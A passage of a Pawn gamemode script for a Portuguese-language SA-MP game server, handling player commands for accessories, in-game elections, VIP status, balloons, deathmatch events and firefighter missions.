			!IsPlayerInDynamicCP(playerid, CP_44) &&
			!IsPlayerInDynamicCP(playerid, CP_45))
	    {
		    SendClientMessage(playerid, COR_ERRO, "Você não está em uma loja de roupas!");
			return 1;
		}
	    RemovePlayerAttachedObject(playerid, 1);
	    WE_SetInt(f(playerid), "useOculos", 0);
	    RemovePlayerAttachedObject(playerid, 2);
	    WE_SetInt(f(playerid), "useMascara", 0);
	    RemovePlayerAttachedObject(playerid, 4);
	    WE_SetInt(f(playerid), "useChapeu", 0);
	    SetarItensPlayer(playerid);
	    SendClientMessage(playerid, COR_AMARELO, "Todos seus itens foram removidos.");
	    return 1;
	}
	if(!strcmp(cmdtext, "/removeroculos", true))
	{
	    SendClientMessage(playerid, COR_AMARELO, "Óculos atual removido com sucesso.");
	    RemovePlayerAttachedObject(playerid, 1);
	    WE_SetInt(f(playerid), "useOculos", 0);
	    SetarItensPlayer(playerid);
	    return 1;
	}
	if(!strcmp(cmdtext, "/removermascara", true))
	{
	    SendClientMessage(playerid, COR_AMARELO, "Máscara atual removida com sucesso.");
	    RemovePlayerAttachedObject(playerid, 2);
	    WE_SetInt(f(playerid), "useMascara", 0);
	    SetarItensPlayer(playerid);
	    return 1;
	}
	if(!strcmp(cmdtext, "/removerchapeu", true))
	{
	    SendClientMessage(playerid, COR_AMARELO, "Chapéu atual removido com sucesso.");
	    RemovePlayerAttachedObject(playerid, 4);
	    WE_SetInt(f(playerid), "useChapeu", 0);
	    SetarItensPlayer(playerid);
	    return 1;
	}
    if(!strcmp(cmdtext, "/candidatarse", true))
    {
		if(PlayerToPoint(1.1, playerid, 362.3257,173.7074,1008.3828) || IsPlayerInDynamicCP(playerid, CP_35))
	    {
	        if(WE_GetInt("Eleitos.ini", "votoStatus") == 0)
	        {
	            SendClientMessage(playerid, COR_ERRO, "Não existem eleições disponíveis no momento.");
	            return 1;
	        }
			if(WE_GetInt("Eleitos.ini", PlayerName(playerid)) == -1)
			{
			    SendClientMessage(playerid, COR_ERRO, "Você já está concorrendo!");
			    return 1;
			}
			if(WE_GetInt("Eleitos.ini", "Candidatos") >= 10)
			{
			    SendClientMessage(playerid, COR_ERRO, "Vagas esgotadas, tente na próxima eleição!");
			    return 1;
			}
			if(strcmp(WE_GetString("Eleitos.ini", "1_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "1_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "2_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "2_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "3_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "3_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "4_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "4_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "5_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "5_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "6_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "6_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "7_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "7_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "8_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "8_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "9_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "9_", PlayerName(playerid));
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "10_"), "Nenhum", true) == 0)
			{
				WE_SetString("Eleitos.ini", "10_", PlayerName(playerid));
			}
			WE_SetInt("Eleitos.ini", "Candidatos", WE_GetInt("Eleitos.ini", "Candidatos") +1);
		    WE_SetInt("Eleitos.ini", PlayerName(playerid), -1);
		    SendClientMessage(playerid, COR_AMARELO, " [Candidato] ");
			format(gStr, sizeof(gStr), " %s você agora está concorrendo a vaga para presidênte.", PlayerName(playerid));
			SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_AMARELO, " [Candidato] ");
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na prefeitura!");
		}
		return 1;
    }
    if(strcmp(cmd, "/votar", true) == 0)
    {
		if(PlayerToPoint(1.1, playerid, 362.3257,173.7074,1008.3828) || IsPlayerInDynamicCP(playerid, CP_35))
	    {
         	if(WE_GetInt("Eleitos.ini", "votoStatus") == 1)
         	{
		  		tmp = strtok(cmdtext, idx);
				if(strlen(tmp) == 0)
				{
				    SendClientMessage(playerid, COR_ERRO, "Uso válido: /Votar [Candidato Vaga ID]");
					return 1;
				}
				new
					canditado = strval(tmp)
				;
				if(WE_GetInt("Eleitos.ini", PlayerName(playerid)) == -2)
				{
				    SendClientMessage(playerid, COR_ERRO, "Somente 1 voto por jogador, você já deu o seu voto!");
				    return 1;
				}
				if(canditado <= 0 || canditado > 10)
				{
				    SendClientMessage(playerid, COR_ERRO, "Você só pode votar de 1 à 10! (Veja a lista de candidatos: /Candidatos)");
					return 1;
				}
				format(gstring, sizeof(gstring), "%d_", canditado);
				if(!strcmp(gstring, "Nenhum", true))
				{
				    SendClientMessage(playerid, COR_ERRO, "Você não pode votar em uma vaga não preenchida!");
				    return 1;
				}
			    SendClientMessage(playerid, COR_AMARELO, " [Voto] ");
       			format(gStr, sizeof(gStr), " Você votou no candidato %s da vaga ID %d com sucesso!", WE_GetString("Eleitos.ini", gstring), canditado);
       			SendClientMessage(playerid, COR_BRANCO, gStr);
        		format(gstring, sizeof(gstring), " %s agora está com %d votos.", WE_GetString("Eleitos.ini", gstring), WE_GetInt("Eleitos.ini", tmp));
       			SendClientMessage(playerid, COR_BRANCO, gstring);
			    SendClientMessage(playerid, COR_AMARELO, " [Voto] ");
    			WE_SetInt("Eleitos.ini", PlayerName(playerid), -2);
			    WE_SetInt("Eleitos.ini", tmp, WE_GetInt("Eleitos.ini", tmp) + 1);
	        }
	        else
	        {
	            SendClientMessage(playerid, COR_ERRO, "Não existem eleições no momento! (Use: /Presidente)");
	        }
	        return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na prefeitura!");
		}
		return 1;
    }
    if(!strcmp(cmdtext, "/candidatos", true))
    {
        if(PlayerToPoint(1.1, playerid, 362.3257,173.7074,1008.3828) || IsPlayerInDynamicCP(playerid, CP_35))
	    {
	        if(WE_GetInt("Eleitos.ini", "votoStatus") == 1)
	        {
		        SendClientMessage(playerid, COR_AMARELO, " [Candidatos] ");
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (1)", WE_GetString("Eleitos.ini", "1_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (2)", WE_GetString("Eleitos.ini", "2_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (3)", WE_GetString("Eleitos.ini", "3_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (4)", WE_GetString("Eleitos.ini", "4_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (5)", WE_GetString("Eleitos.ini", "5_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (6)", WE_GetString("Eleitos.ini", "6_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (7)", WE_GetString("Eleitos.ini", "7_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (8)", WE_GetString("Eleitos.ini", "8_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (9)", WE_GetString("Eleitos.ini", "9_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
				format(gStr, sizeof(gStr), "Candidato: %s - Vaga ID (10)", WE_GetString("Eleitos.ini", "10_"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
	        }
	        else
	        {
	            SendClientMessage(playerid, COR_ERRO, "Não existem eleições no momento! (Use: /Presidente)");
	        }
	        return 1;
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na prefeitura!");
		}
        return 1;
    }
    if(!strcmp(cmdtext, "/presidente", true))
    {
    	if(PlayerToPoint(1.1, playerid, 362.3257,173.7074,1008.3828) || IsPlayerInDynamicCP(playerid, CP_35))
	    {
			if(strcmp(WE_GetString("Eleitos.ini", "Presidente"), "Nenhum", true) == 0)
			{
			    SendClientMessage(playerid, COR_AMARELO, "Não há nenhum presidente no momento.");
			}
			else if(strcmp(WE_GetString("Eleitos.ini", "Presidente"), "Nenhum", false))
			{
			    SendClientMessage(playerid, COR_AMARELO, " [Presidente] ");
				format(gStr, sizeof(gStr), " Presidente atual: %s", WE_GetString("Eleitos.ini", "Presidente"));
				SendClientMessage(playerid, COR_BRANCO, gStr);
			    SendClientMessage(playerid, COR_AMARELO, " [Presidente] ");
			}
			return 1;
		}
 		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não está na prefeitura!");
		}
		return 1;
	}
    if(!strcmp(cmdtext, "/abrirvotacao", true))
    {
        if(aInfo[playerid][Admin] == 0)
        {
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
            return 1;
        }
        SendClientMessage(playerid, COR_AMARELO, "Você liberou as urnas para que os jogadores possam votar.");
        SendClientMessage(playerid, COR_AMARELO, " [Eleição] ");
        format(gStr, sizeof(gStr), " O(A) administrador(a) %s, liberou as urnas para votação.", PlayerName(playerid));
        SendClientMessageToAll(COR_BRANCO, gStr);
        SendClientMessage(playerid, COR_AMARELO, " [Eleição] ");
        WE_SetInt("Eleitos.ini", "votoStatus", 1);
        return 1;
    }
	if(!strcmp(cmdtext, "/fecharvotacao", true))
    {
        if(aInfo[playerid][Admin] == 0)
        {
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
            return 1;
        }
        SendClientMessage(playerid, COR_AMARELO, "Você fechou as urnas para que os jogadores possam votar.");
        format(gStr, sizeof(gStr), " O(A) administrador(a) %s, fechou as urnas para votação.", PlayerName(playerid));
        SendClientMessageToAll(COR_AMARELO, gStr);
        WE_SetInt("Eleitos.ini", "votoStatus", 0);
        return 1;
    }
	if(!strcmp(cmdtext, "/apurar", true))
	{
        if(aInfo[playerid][Admin] == 0)
        {
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
            return 1;
        }
		format(pFile, sizeof(pFile), "Contas/%s.ini", WE_GetString("Eleitos.ini", "Presidente"));
		WE_SetInt(pFile, "Presidente", 0);
        new
            apuracao[10]
		;
		apuracao[0] = WE_GetInt("Eleitos.ini", "1");
		apuracao[1] = WE_GetInt("Eleitos.ini", "2");
		apuracao[2] = WE_GetInt("Eleitos.ini", "3");
		apuracao[3] = WE_GetInt("Eleitos.ini", "4");
		apuracao[4] = WE_GetInt("Eleitos.ini", "5");
		apuracao[5] = WE_GetInt("Eleitos.ini", "6");
		apuracao[6] = WE_GetInt("Eleitos.ini", "7");
		apuracao[7] = WE_GetInt("Eleitos.ini", "8");
		apuracao[8] = WE_GetInt("Eleitos.ini", "9");
		apuracao[9] = WE_GetInt("Eleitos.ini", "10");
		new
			maxVar = -1,
			extVar = 0
		;
		for(new i; i != 10; ++i)
		{
			if(apuracao[i] > maxVar)
			{
				maxVar = apuracao[i];
				extVar = i;
			}
		}
		printf("Posição: %d | Pontuação: %d", extVar+1, apuracao[extVar]);
		new
		    armaz[256]
		;
		if(extVar+1 == 1)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
			format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "1_"), apuracao[extVar]);
			SendClientMessage(playerid, COR_BRANCO, gStr);
			SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
			WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "1_"));
			armaz = WE_GetString("Eleitos.ini", "1_");
		}
		if(extVar+1 == 2)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "2_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "2_"));
		    armaz = WE_GetString("Eleitos.ini", "2_");
		}
		if(extVar+1 == 3)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "3_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "3_"));
		    armaz = WE_GetString("Eleitos.ini", "3_");
		}
		if(extVar+1 == 4)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "4_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "4_"));
		    armaz = WE_GetString("Eleitos.ini", "4_");
		}
		if(extVar+1 == 5)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "5_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "5_"));
		    armaz = WE_GetString("Eleitos.ini", "5_");
		}
		if(extVar+1 == 6)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "6_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "6_"));
		    armaz = WE_GetString("Eleitos.ini", "6_");
		}
  		if(extVar+1 == 7)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "7_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "7_"));
		    armaz = WE_GetString("Eleitos.ini", "7_");
		}
  		if(extVar+1 == 8)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "8_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "8_"));
		    armaz = WE_GetString("Eleitos.ini", "8_");
		}
  		if(extVar+1 == 9)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "9_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "9_"));
		    armaz = WE_GetString("Eleitos.ini", "9_");
		}
  		if(extVar+1 == 10)
		{
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    format(gStr, sizeof(gStr), " %s ganha a eleição com %d de votos!", WE_GetString("Eleitos.ini", "10_"), apuracao[extVar]);
		    SendClientMessage(playerid, COR_BRANCO, gStr);
		    SendClientMessage(playerid, COR_ROXO, " [Novo Presidente] ");
		    WE_SetString("Eleitos.ini", "Presidente", WE_GetString("Eleitos.ini", "10_"));
		    armaz = WE_GetString("Eleitos.ini", "10_");
		}
        CriarArquivoPresidente(armaz);
        format(gstring, sizeof(gstring), "Contas/%s.ini", armaz);
        WE_SetInt(gstring, "Presidente", 1);
	    return 1;
	}
	if(!strcmp(cmd, "/setarvip", true))
	{
	    if(WE_GetInt(f(playerid), "AdminL") == 0 || !IsPlayerAdmin(playerid))
	    {
			return 1;
	    }
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /SetarVIP [ID] [MesFinal] [DiaFinal] [AnoFinal]");
			return 1;
		}
		new
			id = strval(tmp)
		;
		if(!IsPlayerConnected(id))
		{
		    SendClientMessage(playerid, COR_BRANCO, "Jogador(a) não conectado(a)!");
			return 1;
		}
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /SetarVIP [ID] [MesFinal] [DiaFinal] [AnoFinal]");
			return 1;
		}
		new
			MesFinal = strval(tmp)
		;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /SetarVIP [ID] [MesFinal] [DiaFinal] [AnoFinal]");
			return 1;
		}
		new
			DiaFinal = strval(tmp)
		;
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /SetarVIP [ID] [MesFinal] [DiaFinal] [AnoFinal]");
			return 1;
		}
		new
			AnoFinal = strval(tmp)
		;
		if(AnoFinal > ANO_LIMITE+1)
		{
		    SendClientMessage(playerid, COR_ERRO, "O VIP não pode passar de 1 ano!");
		    return 1;
		}
		format(gStr, sizeof(gStr), "Parabéns, você é o mais novo VIP do servidor. Administrador(a) responsável: %s. Data de vencimento:{FFFFFF} %d/%d/%d", PlayerName(playerid), DiaFinal, MesFinal, AnoFinal);
		SendClientMessage(id, AZUL_WE, gStr);
 		format(gStr, sizeof(gStr), "Você tornou %s VIP, data de vencimento:{FFFFFF} %d/%d/%d", PlayerName(id), DiaFinal, MesFinal, AnoFinal);
		SendClientMessage(playerid, VERMELHO_WE, gStr);
		GameTextForPlayer(id, "~y~VIP", 1000, 0);
		WE_SetInt(f(id), "PLAYER_VIP", 1);
		WE_SetInt(f(id), "VIP_MES", MesFinal);
		WE_SetInt(f(id), "VIP_DIA", DiaFinal);
		WE_SetInt(f(id), "VIP_ANO", AnoFinal);
		pInfo[id][PLAYER_VIP] = 1;
		WE_SetInt(f(id), "Jetpack", 1);
		pInfo[id][Jetpack] = 1;
		return 1;
	}
	if(!strcmp(cmd, "/tirarvip", true))
	{
	    if(aInfo[playerid][Admin] == 0)
	    {
			return 1;
	    }
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /TirarVIP [ID]");
			return 1;
		}
		new
			id = strval(tmp)
		;
		if(!IsPlayerConnected(id))
		{
		    SendClientMessage(playerid, COR_BRANCO, "Jogador(a) não conectado(a)!");
			return 1;
		}
 		format(gStr, sizeof(gStr), "Você removeu o VIP de %s", PlayerName(id));
		SendClientMessage(playerid, COR_AMARELO, gStr);
		WE_SetInt(f(id), "PLAYER_VIP", 0);
		WE_SetInt(f(id), "VIP_MES", 0);
		WE_SetInt(f(id), "VIP_DIA", 0);
		pInfo[id][PLAYER_VIP] = 0;
		return 1;
	}
	if(!strcmp(cmd, "/modop", true))
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
	        if(modoP == 0)
	        {
	            SendClientMessage(playerid, COR_AMARELO, "Prisão OFF!");
	            modoP = 1;
	        }
	        else if(modoP == 1)
	        {
	            SendClientMessage(playerid, COR_AMARELO, "Prisão ON!");
	            modoP = 0;
	        }
		}
		return 1;
	}
	if(!strcmp(cmd, "/comandosvip", true))
	{
	    if(pInfo[playerid][PLAYER_VIP] == 1)
	    {
	    	ShowPlayerDialog(playerid, 9983, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Comandos VIP", "{FFFFFF}Menu teleportes: /Teles\n{FFFFFF}Chat VIP: . Mensagem\n{FFFFFF}Mochila a Jato: /Jetpack\n{FFFFFF}Neons: /ListaNeon\n{FFFFFF}Caixa móvel: /AutoDepositar - /AutoSacar", "Fechar", "");
	    }
	    else
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não é um(a) jogador(a) VIP!");
	    }
	    return 1;
	}
	if(!strcmp(cmd, "/balao", true))
	{
	    if(WE_GetInt(f(playerid), "Balao") != 0)
	    {
	    	ShowPlayerDialog(playerid, D_BALAO, DIALOG_STYLE_LIST, "Funções Balão", "\tComandos\n\tModelo\n\tVelocidade\n\tMensagem\n\tRespawn", "OK", "Sair");
		}
		else
		{
		    SendClientMessage(playerid, COR_ERRO, "Você não tem um balão!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/criarbalao", true))
	{
	    if(WE_GetInt(f(playerid), "AdminL") == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão para criar um balão próprio!");
	        return 1;
	    }
 		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /CriarBalao [ID]");
			return 1;
		}
		new
			id = strval(tmp)
		;
		if(!IsPlayerConnected(id))
		{
		    SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
			return 1;
		}
		if(WE_GetInt(f(id), "Balao") != 0)
		{
		    SendClientMessage(playerid, COR_ERRO, "Esse(a) jogador(a) já possui um balão!");
		    return 1;
		}
		new
			old, ild
		;
		for(new b = 1; b < MAX_BALOES; ++b)
		{
			format(gStr, sizeof(gStr), "Baloes/Balao%d.ini", b);
			if(fexist(gStr))
			{
				++ old;
			}
			if(!fexist(gStr))
			{
				ild = old + 1;
				break;
			}
		}
		new
		    Float:getMypos[3]
		;
		GetPlayerPos(playerid, getMypos[0], getMypos[1], getMypos[2]);
		CriarBalaoInGame(ild, id, getMypos[0], getMypos[1], floatsub(getMypos[2], 0.5));
		format(pFile, sizeof(pFile), "Balão ID %d criado para %s", ild, PlayerName(id));
		SendClientMessage(playerid, COR_AMARELO, pFile);
		WE_SetInt(f(id), "Balao", ild);
		return 1;
	}
	if(!strcmp(cmdtext, "/marmas", true))
	{
	    if(aInfo[playerid][Admin] == 1)
	    {
			new
			    Weapons = 0, Ammo, Msg[64], gunname[64]
			;
			for(new i = 0; i < 13; i ++)
			{
			    GetWeaponName(i, gunname, sizeof(gunname));
			    GetPlayerWeaponData(playerid, i, Weapons, Ammo);
			    if(Weapons != 0)
			    {
			        format(Msg, sizeof(Msg), "%s armaID %d, %d balas de munição, arma slotID %i", gunname, Weapons, Ammo, i);
			        SendClientMessage(playerid, -1, Msg);
			    }
			}
		}
	    return 1;
	}
	if(!strcmp(cmdtext, "/evDM", true))
	{
		if(aInfo[playerid][Admin] == 0)
		{
			SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
			return 1;
		}
		else
		{
			ShowPlayerDialog(playerid, D_DMEVENT, DIALOG_STYLE_LIST, "Configurações DM", "Arena\nArma ID\nArma Pack\nTempo\nColete\nPrêmio\nTop\nCarregar\nLiberar\nIniciar\nFechar", "Editar", "Fechar");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/participarDM", true))
	{
	    if(esDM[evdmLiberado] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Não há um evento de DM criado no momento!");
	        return 1;
	    }
	    if(epDM[playerid][dmParticipando] == 1)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você já está participando do evento!");
	        return 1;
	    }
	    if(esDM[evdmArenaID] == 6)
	    {
			SetPlayerPos(playerid, dmePos[0], dmePos[1], dmePos[2]);
			SetPlayerInterior(playerid, 0);
		}
	    else
	    {
						if(esDM[evdmArenaID] == 1)
						{
				            new rnd = random(sizeof(saeArena1));
							SetPlayerPos(playerid, saeArena1[rnd][0], saeArena1[rnd][1], saeArena1[rnd][2]);
							SetPlayerFacingAngle(playerid, saeArena1[rnd][3]);
							SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
						}
						if(esDM[evdmArenaID] == 2)
				        {
				            new rnd = random(sizeof(saeArena2));
							SetPlayerPos(playerid, saeArena2[rnd][0], saeArena2[rnd][1], saeArena2[rnd][2]);
							SetPlayerFacingAngle(playerid, saeArena2[rnd][3]);
							SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
						}
						if(esDM[evdmArenaID] == 3)
				        {
				            new rnd = random(sizeof(saeArena3));
							SetPlayerPos(playerid, saeArena3[rnd][0], saeArena3[rnd][1], saeArena3[rnd][2]);
							SetPlayerFacingAngle(playerid, saeArena3[rnd][3]);
							SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
						}
						if(esDM[evdmArenaID] == 4)
				        {
				            new rnd = random(sizeof(saeArena4));
							SetPlayerPos(playerid, saeArena4[rnd][0], saeArena4[rnd][1], saeArena4[rnd][2]);
							SetPlayerFacingAngle(playerid, saeArena4[rnd][3]);
							SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
						}
						if(esDM[evdmArenaID] == 5)
				        {
				            new rnd = random(sizeof(saeArena5));
							SetPlayerPos(playerid, saeArena5[rnd][0], saeArena5[rnd][1], saeArena5[rnd][2]);
							SetPlayerFacingAngle(playerid, saeArena5[rnd][3]);
							SetPlayerInterior(playerid, intArena[esDM[evdmArenaID]][0]);
						}
		}
		ResetPlayerWeapons(playerid);
		epDM[playerid][dmParticipando] = 1;
		SetPlayerColor(playerid, COR_ERRO);
 		if(esDM[evdmCount] <= 0 && esDM[evdmCriado] == 1)
	    {
	        ResetPlayerWeapons(playerid);
            dmSetEquipamentos(playerid);
	    }
	    SendClientMessage(playerid, COR_AMARELO, "Você está participando do evento de DM.");
		return 1;
	}
	if(!strcmp(cmdtext, "/desistirDM", true))
	{
	    if(esDM[evdmCriado] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Não há um evento de DM criado no momento!");
	        return 1;
	    }
	    if(epDM[playerid][dmParticipando] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não está participando do evento!");
	        return 1;
	    }
		evdmResetPlayer(playerid);
		SetPlayerArmas(playerid);
		SendClientMessage(playerid, COR_AMARELO, "Você desistiu do evento de DM.");
		return 1;
	}
	if(!strcmp(cmdtext, "/proximoincendio", true))
	{
	    if(pInfo[playerid][Prof] == BOMBEIRO || aInfo[playerid][Admin] == 1)
	    {
		    if(IsPlayerInDynamicCP(playerid, CP_39))
		    {
		        if(FireAtual[playerid] != 0)
		        {
		            SendClientMessage(playerid, COR_ERRO, "Você já tem um incêndio pentente para apagar!");
		          	format(gStr, sizeof(gStr), "A casa ID %d está pegando para você apagar.", FireAtual[playerid]);
		        	SendClientMessage(playerid, COR_AMARELO, gStr);
		            return 1;
		        }
		        new
		            c = minrand(1, MAX_CASAS),
		            h = minrand(120, 350)
				;
				if(FireCreated[c] == 1)
				{
				    SendClientMessage(playerid, COR_ERRO, "Tente novamente nenhum incêndio foi localizado!");
				}
				else if(FireCreated[c] == 0)
				{
				    FireAtual[playerid] = c;
				    FireBaixa[playerid] = 0;
					AddFire(playerid, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ], h);
                    SetPlayerMapIcon(playerid, 90, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]-10, 20,0,MAPICON_GLOBAL_CHECKPOINT);
					new
						Float:X,
						Float:Y,
						Float:Z,
						Float:Distance,
						fireID = c
					;
					X = 2770.6172, Y = -1627.9358, Z = 12.177;

					Distance = GetDistanceBetweenPoints(X, Y, Z, CasaInfo[fireID][PickupX], CasaInfo[fireID][PickupY], CasaInfo[fireID][PickupZ]);
					new
						zone[MAX_ZONE_NAME]
					;
					GetCasa2DZone(fireID, zone, MAX_ZONE_NAME);

					format(gstring, sizeof(gstring), "{FFFFFF}Casa {FF0000}%d {FFFFFF}Incêndiada\n\n{FFFFFF}Localização {FFFF00}%s\n\n{FFFFFF}Distância {00F746}%.1f", c, zone, Distance);
				 	ShowPlayerDialog(playerid, D_PAULCAR, DIALOG_STYLE_MSGBOX, "{FF0000}Corpo de Bombeiros", gstring, "OK", "");
				}
				return 1;
		    }
		    else
		    {
	        	SendClientMessage(playerid, COR_ERRO, "Você não está no Corpo de Bombeiros!");
	    	}
		    return 1;
	    }
	    else
	    {
	    	SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
		}
	    return 1;
	}
	if(!strcmp(cmdtext, "/baixaincendio", true))
	{
	    if(pInfo[playerid][Prof] == BOMBEIRO || aInfo[playerid][Admin] == 1)
	    {
